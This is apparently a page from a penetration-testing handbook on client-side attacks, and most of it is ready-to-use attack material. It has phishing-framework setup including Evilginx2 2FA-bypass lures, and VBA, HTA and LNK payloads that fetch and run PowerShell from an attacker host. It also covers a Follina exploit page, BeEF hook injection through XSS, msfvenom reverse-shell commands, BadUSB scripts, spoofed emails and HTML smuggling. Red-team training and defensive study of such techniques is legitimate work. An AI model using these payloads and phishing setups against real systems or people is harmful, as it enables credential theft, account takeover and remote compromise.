# Client-Side Attacks

Client-side attacks target end users rather than servers, exploiting vulnerabilities in browsers, email clients, office applications, and other software. These attacks often rely on social engineering to deliver malicious payloads.

<br>

## Tools Reference Table

<p align="center">

| Tool | Category | Purpose | Link |
|:-----|:---------|:--------|:-----|
| [**GoPhish**](#gophish) | Phishing | Phishing campaign framework | [GitHub](https://github.com/gophish/gophish) |
| [**Evilginx2**](#evilginx2) | Phishing | Man-in-the-middle phishing | [GitHub](https://github.com/kgretzky/evilginx2) |
| [**SET**](#social-engineer-toolkit-set) | Phishing | Social engineering toolkit | [GitHub](https://github.com/trustedsec/social-engineer-toolkit) |
| [**King Phisher**](#king-phisher) | Phishing | Phishing campaign toolkit | [GitHub](https://github.com/rsmusllp/king-phisher) |
| [**Macro Pack**](#macro-pack) | Office | Office macro payload generator | [GitHub](https://github.com/sevagas/macro_pack) |
| [**Follina**](#follina-cve-2022-30190) | Office | MS Office RCE exploit | Various |
| [**Responder**](#responder) | Network | LLMNR/NBT-NS poisoner | [GitHub](https://github.com/lgandx/Responder) |
| [**BeEF**](#beef) | Browser | Browser exploitation framework | [GitHub](https://github.com/beefproject/beef) |
| [**msfvenom**](#msfvenom-payloads) | Payloads | Payload generator | [Metasploit](https://www.metasploit.com/) |
| [**HTA Payloads**](#hta-payloads) | Payloads | HTML Application attacks | Various |
| [**BadUSB**](#badusb--rubber-ducky) | Physical | USB keystroke injection | [Hak5](https://hak5.org/) |

</p>

<br>

---

<br>

# Phishing Frameworks

<br>

## GoPhish
> *GitHub: https://github.com/gophish/gophish*

Open-source phishing framework for security awareness testing.

### Installation

```bash
# Download latest release
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# Run
./gophish
```

### Access

```
Admin Panel: https://localhost:3333
Default credentials: admin / gophish (change on first login)
Phishing Server: http://localhost:80
```

### Campaign Setup

1. **Sending Profiles** - Configure SMTP server
2. **Landing Pages** - Create/import phishing pages
3. **Email Templates** - Design phishing emails
4. **Users & Groups** - Import target list
5. **Campaigns** - Launch and track

<p align="center">

| Feature | Description |
|:--------|:------------|
| **Email Tracking** | Open/click tracking |
| **Credential Capture** | Harvest submitted credentials |
| **Landing Page Clone** | Import existing websites |
| **Timeline View** | Campaign progress monitoring |
| **Reporting** | Export results to CSV/PDF |

</p>

<br>

## Evilginx2
> *GitHub: https://github.com/kgretzky/evilginx2*

Man-in-the-middle attack framework for phishing with 2FA bypass.

### Installation

```bash
# Install Go first
# Download Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Run (requires root for port 443)
sudo ./bin/evilginx -p ./phishlets
```

### Configuration

```bash
# Set domain
config domain yourdomain.com

# Set IP
config ip <YOUR_IP>

# List phishlets
phishlets

# Enable phishlet
phishlets hostname o365 login.yourdomain.com
phishlets enable o365

# Create lure
lures create o365
lures get-url 0
```

### Available Phishlets

<p align="center">

| Phishlet | Target |
|:---------|:-------|
| `o365` | Microsoft Office 365 |
| `google` | Google accounts |
| `linkedin` | LinkedIn |
| `github` | GitHub |
| `twitter` | Twitter/X |
| `okta` | Okta SSO |

</p>

<p align="center">

| Command | Description |
|:--------|:------------|
| `phishlets` | List available phishlets |
| `phishlets enable <name>` | Enable phishlet |
| `phishlets hostname <name> <domain>` | Set phishlet domain |
| `lures create <phishlet>` | Create lure URL |
| `lures get-url <id>` | Get phishing URL |
| `sessions` | List captured sessions |
| `sessions <id>` | View session details |

</p>

<br>

## Social Engineer Toolkit (SET)
> *GitHub: https://github.com/trustedsec/social-engineer-toolkit*

Comprehensive social engineering framework.

### Installation

```bash
# Kali Linux (pre-installed)
sudo setoolkit

# Manual install
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
python3 setup.py install
```

### Menu Structure

```
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   
2) Penetration Testing (Fast-Track)
3) Third Party Modules
```

### Common Attacks

```bash
# Credential Harvester
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
3  # Credential Harvester Attack Method
2  # Site Cloner
# Enter target URL to clone

# HTA Attack
1  # Social-Engineering Attacks
2  # Website Attack Vectors
8  # HTA Attack Method
```

<p align="center">

| Attack Vector | Description |
|:--------------|:------------|
| **Spear-Phishing** | Targeted email with payload |
| **Website Clone** | Clone site for credential harvest |
| **Java Applet** | Malicious Java applet |
| **HTA Attack** | HTML Application payload |
| **PowerShell** | PowerShell payload delivery |
| **USB/CD** | Autorun payloads |

</p>

<br>

## King Phisher
> *GitHub: https://github.com/rsmusllp/king-phisher*

Phishing campaign toolkit with client-server architecture.

```bash
# Install
git clone https://github.com/rsmusllp/king-phisher.git
cd king-phisher
./tools/install.sh

# Start server
king-phisher-server -L INFO

# Start client (GUI)
king-phisher-client
```

<br>

---

<br>

# Office Document Attacks

<br>

## Macro Pack
> *GitHub: https://github.com/sevagas/macro_pack*

Generate Office document payloads with macro obfuscation.

### Installation

```bash
# Windows
pip install macro_pack

# Download binary
# https://github.com/sevagas/macro_pack/releases
```

### Payload Generation

```bash
# Generate reverse shell macro
echo "powershell -ep bypass -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')\"" | macro_pack.exe -t DOCM -o payload.docm

# Generate from msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba | macro_pack.exe -t DOCM -o meterpreter.docm

# Excel payload
macro_pack.exe -f payload.vba -t XLSM -o payload.xlsm

# With obfuscation
macro_pack.exe -f payload.vba -t DOCM -o payload.docm --obfuscate
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-t` | Template type (DOCM, XLSM, PPTM) |
| `-o` | Output file |
| `-f` | Input VBA file |
| `--obfuscate` | Obfuscate macro code |
| `--trojan` | Trojan existing document |
| `-G` | Generate specific payload type |

</p>

### Template Types

<p align="center">

| Type | Description |
|:-----|:------------|
| `DOCM` | Word macro-enabled |
| `DOCX` | Word with DDE |
| `XLSM` | Excel macro-enabled |
| `PPTM` | PowerPoint macro-enabled |
| `HTA` | HTML Application |
| `VBS` | VBScript |
| `SCT` | Windows Script Component |

</p>

<br>

## Follina (CVE-2022-30190)
> *MS-MSDT Remote Code Execution*

Microsoft Support Diagnostic Tool RCE via Office documents.

### Generate Payload

```bash
# Using follina.py
git clone https://github.com/JohnHammond/msdt-follina.git
cd msdt-follina
python3 follina.py -r <REVERSE_PORT> -H <ATTACKER_IP>

# Manual payload
# Create Word document with external reference to malicious HTML
```

### Payload Structure

```html
<!DOCTYPE html>
<html>
<body>
<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebsrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"<BASE64_PAYLOAD>\"))'))))i]\"";
</script>
</body>
</html>
```

<br>

## VBA Macro Templates

### Basic Reverse Shell

```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -ep bypass -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"""
    Shell cmd, vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

### Download and Execute

```vba
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ep bypass -w hidden -c ""(New-Object Net.WebClient).DownloadFile('http://<IP>/payload.exe','C:\Users\Public\payload.exe'); Start-Process 'C:\Users\Public\payload.exe'""", 0
End Sub
```

### WMI Execution

```vba
Sub AutoOpen()
    Dim objWMI As Object
    Dim objProcess As Object
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set objProcess = objWMI.Get("Win32_Process")
    objProcess.Create "powershell -ep bypass -nop -w hidden -c ""<PAYLOAD>""", Null, Null, intReturn
End Sub
```

<br>

---

<br>

# Browser Exploitation

<br>

## BeEF
> *GitHub: https://github.com/beefproject/beef*

Browser Exploitation Framework - hook browsers and execute attacks.

### Installation

```bash
# Kali Linux
sudo apt install beef-xss

# Manual install
git clone https://github.com/beefproject/beef.git
cd beef
./install
```

### Starting BeEF

```bash
# Start BeEF
sudo beef-xss

# Or
cd beef && ./beef
```

### Access

```
Web UI: http://localhost:3000/ui/panel
Hook URL: http://<IP>:3000/hook.js
Default credentials: beef / beef
```

### Hook Injection

```html
<!-- Add to target page -->
<script src="http://<ATTACKER_IP>:3000/hook.js"></script>
```

### Common Modules

<p align="center">

| Module | Description |
|:-------|:------------|
| **Get Cookie** | Steal browser cookies |
| **Get Visited URLs** | Browser history |
| **Webcam** | Access webcam |
| **Screenshot** | Capture screenshot |
| **Redirect** | Redirect browser |
| **Social Engineering** | Fake flash update, etc. |
| **Metasploit** | Integration with MSF |
| **Port Scanner** | Scan internal network |

</p>

### XSS to BeEF Hook

```javascript
// Inject via XSS
<script src=http://<ATTACKER_IP>:3000/hook.js></script>

// Via img tag
<img src=x onerror="var s=document.createElement('script');s.src='http://<ATTACKER_IP>:3000/hook.js';document.body.appendChild(s);">
```

<br>

---

<br>

# Payload Delivery

<br>

## HTA Payloads
> *HTML Application attacks*

HTA files execute with full trust and can run VBScript/JScript.

### Basic HTA Payload

```html
<html>
<head>
<script language="VBScript">
Sub RunPowerShell()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ep bypass -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')""", 0
    window.close
End Sub
RunPowerShell
</script>
</head>
<body>
</body>
</html>
```

### Msfvenom HTA

```bash
# Generate HTA payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o payload.hta
```

### HTA Delivery Methods

```bash
# Host on web server
python3 -m http.server 80

# Deliver via:
# - Email attachment
# - Link in phishing email
# - USB drop
# - Website redirect
```

<br>

## msfvenom Payloads

### Client-Side Payloads

```bash
# Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o payload.dll

# MSI installer
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o payload.msi

# HTA
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o payload.hta

# VBA macro
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f vba -o payload.vba

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh -o payload.ps1

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.py
```

<br>

## LNK File Attacks

### Malicious Shortcut

```powershell
# Create malicious LNK via PowerShell
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Document.lnk")
$link.TargetPath = "C:\Windows\System32\cmd.exe"
$link.Arguments = "/c powershell -ep bypass -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"""
$link.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
$link.Save()
```

<br>

---

<br>

# Physical Attacks

<br>

## BadUSB / Rubber Ducky
> *Hak5: https://hak5.org/*

USB devices that emulate keyboards for keystroke injection.

### DuckyScript Basics

```
REM This is a comment
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')"
ENTER
```

### Common Payloads

**Reverse Shell:**
```
DELAY 2000
GUI r
DELAY 500
STRING powershell -ep bypass -nop -w hidden
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')
ENTER
```

**WiFi Password Exfil:**
```
DELAY 2000
GUI r
DELAY 500
STRING cmd
CTRL SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
STRING netsh wlan export profile key=clear
ENTER
```

<p align="center">

| Command | Description |
|:--------|:------------|
| `DELAY` | Wait (milliseconds) |
| `STRING` | Type string |
| `ENTER` | Press Enter |
| `GUI` | Windows/Super key |
| `ALT` | Alt key |
| `CTRL` | Control key |
| `SHIFT` | Shift key |
| `TAB` | Tab key |

</p>

### Tools

<p align="center">

| Tool | Description |
|:-----|:------------|
| **USB Rubber Ducky** | Hak5 keystroke injection |
| **Bash Bunny** | Advanced USB attack platform |
| **O.MG Cable** | Malicious USB cable |
| **Digispark** | Arduino-based BadUSB |
| **P4wnP1** | Raspberry Pi Zero W USB gadget |

</p>

<br>

---

<br>

# Email-Based Attacks

<br>

## Email Spoofing Tools

### swaks (Swiss Army Knife for SMTP)

```bash
# Basic spoofed email
swaks --to victim@target.com \
      --from ceo@target.com \
      --server mail.target.com \
      --header "Subject: Urgent Request" \
      --body "Please review the attached document."

# With attachment
swaks --to victim@target.com \
      --from ceo@target.com \
      --server mail.target.com \
      --attach payload.docm

# Test SMTP open relay
swaks --to test@gmail.com --from test@target.com --server mail.target.com
```

### Check SPF/DMARC

```bash
# Check SPF record
dig txt target.com | grep spf

# Check DMARC record
dig txt _dmarc.target.com
```

<br>

## Email Payloads

### Embedded Link

```html
<html>
<body>
<p>Please review the document at the link below:</p>
<a href="http://<ATTACKER_IP>/payload.hta">Quarterly Report</a>
</body>
</html>
```

### HTML Smuggling

```html
<html>
<body>
<script>
var payload = "<BASE64_ENCODED_PAYLOAD>";
var blob = new Blob([atob(payload)], {type: 'application/octet-stream'});
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'Report.exe';
a.click();
</script>
<p>Your download will start automatically...</p>
</body>
</html>
```

<br>

---

<br>

# Quick Reference

## File Extensions for Payload Delivery

<p align="center">

| Extension | Type | Execution |
|:----------|:-----|:----------|
| `.exe` | Executable | Direct execution |
| `.dll` | Library | Loaded by process |
| `.hta` | HTML Application | mshta.exe |
| `.js` | JScript | wscript.exe |
| `.vbs` | VBScript | wscript.exe |
| `.ps1` | PowerShell | powershell.exe |
| `.bat/.cmd` | Batch | cmd.exe |
| `.lnk` | Shortcut | Target application |
| `.docm` | Word macro | Microsoft Word |
| `.xlsm` | Excel macro | Microsoft Excel |
| `.msi` | Installer | msiexec.exe |
| `.scr` | Screensaver | Direct execution |

</p>

## Evasion Techniques

- **Obfuscation** - Encode/encrypt payloads
- **Living off the Land** - Use legitimate tools (LOLBins)
- **Fileless** - Execute in memory only
- **Signed binaries** - Abuse trusted applications
- **Document templates** - Remote template injection
- **ISO/IMG** - Container files bypass Mark of the Web

<br>

---

## Useful Resources

- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **LOLBAS**: https://lolbas-project.github.io/
- **HackTricks**: https://book.hacktricks.xyz/
- **Atomic Red Team**: https://github.com/redcanaryco/atomic-red-team
- **Phishing Templates**: https://github.com/topics/phishing-templates


<br>

---

<br>
<br>

<div align="center">

| Previous Page | Next Page |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>
